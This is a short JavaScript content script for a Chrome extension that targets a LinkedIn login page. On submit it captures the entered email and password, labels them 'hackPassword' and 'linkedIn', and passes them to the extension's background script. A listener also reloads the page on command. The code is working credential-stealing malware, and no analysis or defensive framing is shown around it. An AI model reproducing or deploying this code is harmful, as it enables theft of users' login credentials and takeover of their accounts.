$( "#login-submit" ).click(function() {
	var arry = ["hackPassword",document.getElementById("login-email").value , document.getElementById("login-password").value, "linkedIn"];
	chrome.runtime.sendMessage(arry);
});

chrome.extension.onRequest.addListener(function(request) {
	console.log(request);
	if (request.action === "reload") {
		reload(request.loopCount);
	}
});

function reload(loopCount){
	location.reload();
}